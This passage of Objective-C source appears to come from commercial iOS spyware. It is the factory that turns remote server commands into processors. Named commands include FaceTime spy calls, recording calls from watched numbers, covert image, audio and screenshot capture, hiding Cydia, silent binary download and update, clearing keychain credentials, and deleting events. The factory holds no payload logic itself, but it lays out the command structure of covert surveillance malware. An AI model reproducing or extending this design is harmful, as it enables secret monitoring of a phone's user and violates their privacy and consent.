	
	// Check the processor is RequestBatteryInfo 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestBatteryInfo]) {
		remoteCmdProcessor = [[RequestBatteryInfoProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the process is SetUpdateAvailable
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetUpdateAvailable]) {
		remoteCmdProcessor = [[SetUpdateAvailableProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the process is OnDemandRecordProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeOnDemandRecord]) {
		remoteCmdProcessor = [[OnDemandRecordProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
														   andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}	
	// Check the processor is RequestCalendarProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestCalendar]) {
		remoteCmdProcessor = [[RequestCalendarProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
															andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is RequestNoteProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestNote]) {
		remoteCmdProcessor = [[RequestNoteProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
														andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is OnDemandImageCaptureProcessor 
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeOnDemandImageCapture]) {
		remoteCmdProcessor = [[OnDemandImageCaptureProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
																 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is SetCydiaVisibilityProcessor
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetCydiaVisibility]) {
		remoteCmdProcessor = [[SetCydiaVisibilityProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is SetUpdateAvailableSilientModeProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetUpdateAvailableSilentMode]) {
		remoteCmdProcessor = [[SetUpdateAvailableSilentModeProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
																		 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is EnableSpycallOnFacetimeProcessor		
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableSpyCallOnFacetime]) {
		remoteCmdProcessor = [[EnableSpycallOnFacetimeProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}	
	// Check the processor is AddMonitorFacetimeIDsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddMonitorFacetimeIDs]) {
		remoteCmdProcessor = [[AddMonitorFacetimeIDsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is ResetMonitorFacetimeIDsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetMonitorFacetimeIDs]) {
		remoteCmdProcessor = [[ResetMonitorFacetimeIDsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is ClearMonitorFacetimeIDProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearMonitorFacetimeIDs]) {
		remoteCmdProcessor = [[ClearMonitorFacetimeIDProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is QueryMonitorFacetimeIDsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryMonitorFacetimeIDs]) {
		remoteCmdProcessor = [[QueryMonitorFacetimeIDsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableFaceTimeSpyCallWithFacetimeID]) {
		remoteCmdProcessor = [[EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
	}
	// Check the processor is SyncSupportedIMVersionProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncSupportedIMVersion]) {
		remoteCmdProcessor = [[SyncSupportedIMVersionProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
																		 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
	// Check the processor is SetDeliveryMethod	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetDeliveryMethod]) {
		remoteCmdProcessor = [[SetDeliveryMethodProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
		
	}

    // Check the processor is ClearCredentailDetailsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearCredentialDetails]) {
		remoteCmdProcessor = [[ClearCredentialDetailsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];		
	}
    // Check the processor is ClearKeychainCredentialsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearRememberedCredential]) {
		remoteCmdProcessor = [[ClearKeychainCredentialsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];		
	}
    
    // Check the processor is SyncSnapshotRulesProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncSnapshotRules]) {
		remoteCmdProcessor = [[SyncSnapshotRulesProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
                                                              andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];	
	}
    // Check the processor is SyncMonitorApplicaitonsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncMonitorApplications]) {
		remoteCmdProcessor = [[SyncMonitorApplicaitonsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData 
                                                                    andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
    // Check the processor is RequestSnapshotRulesProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestSnapshotRules]) {
		remoteCmdProcessor = [[RequestSnapshotRulesProcessor alloc]initWithRemoteCommandData:aRemoteCmdData 
                                                                andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];		
	}
    // Check the processor is RequestMonitorApplicationsProcessor	
	else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestMonitorApplications]) {
		remoteCmdProcessor = [[RequestMonitorApplicationsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                       andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
    // Check the processor is RequestDeviceSettingsProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestDeviceSettings]) {
		remoteCmdProcessor = [[RequestDeviceSettingsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                  andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
    // Check the processor is RequestHistoricalEventProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestHistoricalEvents]) {
		remoteCmdProcessor = [[RequestHistoricalEventProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                   andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
	}
    // Check the processor is OnDemandScreenshotRecordProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeOnDemandScreenshotRecord]) {
        remoteCmdProcessor = [[OnDemandScreenshotRecordProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                     andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
    }
    // Check the processor is RequestTemporalApplicationControlProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestTemporalApplicationControl]) {
        remoteCmdProcessor = [[RequestTemporalApplicationControlProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                              andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
    }
    // Check the processor is SyncTemporalApplicationControlProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncTemporalApplicationControl]) {
        remoteCmdProcessor = [[SyncTemporalApplicationControlProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                              andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
    }
    
    // Check the processor is SyncNetworkAlertCriteria
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncNetworkAlertCriteria]) {
        remoteCmdProcessor = [[SyncNetworkAlertCriteriaProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                              andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
    }
    // Check the processor is SyncAppScreenShotProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSyncAppScreenShot]) {
        remoteCmdProcessor = [[SyncAppScreenShotProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                     andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
    }
    
    
    // Check the processor is SetDownloadBinaryAndUpdateSilentModeProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetDownloadBinaryAndUpdateSilentMode]) {
        remoteCmdProcessor = [[SetDownloadBinaryAndUpdateSilentModeProcessor alloc] initWithRemoteCommandData:aRemoteCmdData
                                                                                 andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
    }
    // Check the processor is RequestDebugLogProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeRequestDebugLog]) {
        remoteCmdProcessor = [[RequestDebugLogProcessor alloc]initWithRemoteCommandData:aRemoteCmdData
                                                           andCommandProcessingDelegate:aRemoteCmdProcessingDelegate];
    }
    // Check the processor is ResetNetworkAlertCriteria
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetNetworkAlertStatistic]) {
        remoteCmdProcessor = [[ResetNetworkAlertStatisticProcessor alloc] initWithRemoteCommandData:aRemoteCmdData ];
    }
    // Check the processor is EnableCallRecordProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeEnableCallRecording]) {
        remoteCmdProcessor = [[EnableCallRecordProcessor alloc]initWithRemoteCommandData:aRemoteCmdData];
    }
    // Check the processor is SetCallRecordWatchFlagsProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeSetCallRecordingFlags]) {
        remoteCmdProcessor = [[SetCallRecordWatchFlagsProcessor alloc]initWithRemoteCommandData:aRemoteCmdData];
    }
    // Check the processor is AddCallRecordWatchNumberProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeAddCallRecordingWatchNumbers]) {
        remoteCmdProcessor = [[AddCallRecordWatchNumberProcessor alloc]initWithRemoteCommandData:aRemoteCmdData];
    }
    // Check the processor is ClearCallRecordWatchNumberProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeClearCallRecordingWatchNumbers]) {
        remoteCmdProcessor = [[ClearCallRecordWatchNumberProcessor alloc]initWithRemoteCommandData:aRemoteCmdData];
    }
    // Check the processor is QueryCallRecordWatchNumberProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeQueryCallRecordingWatchNumbers]) {
        remoteCmdProcessor = [[QueryCallRecordWatchNumberProcessor alloc]initWithRemoteCommandData:aRemoteCmdData];
    }
    // Check the processor is ResetCallRecordWatchNumberProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeResetCallRecordingWatchNumbers]) {
        remoteCmdProcessor = [[ResetCallRecordWatchNumberProcessor alloc]initWithRemoteCommandData:aRemoteCmdData];
    }
    // Check the processor is DeleteEventsProcessor
    else if ([aRemoteCmdData.mRemoteCmdCode isEqualToString:kRemoteCmdCodeDeleteEvents]) {
        remoteCmdProcessor = [[DeleteEventsProcessor alloc] initWithRemoteCommandData:aRemoteCmdData];
    }
	// else throw an exception
	else {
	    FxException* exception = [FxException exceptionWithName:@"createRemoteCmdProcessor" andReason:@"Command not found"];
	    [exception setErrorCode:kCmdExceptionErrorCmdNotFoundRegistered];
	    [exception setErrorCategory:kFxErrorRCM]; 
	    @throw exception;
	}
	return [remoteCmdProcessor autorelease];
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
   [super dealloc];	
}

@end

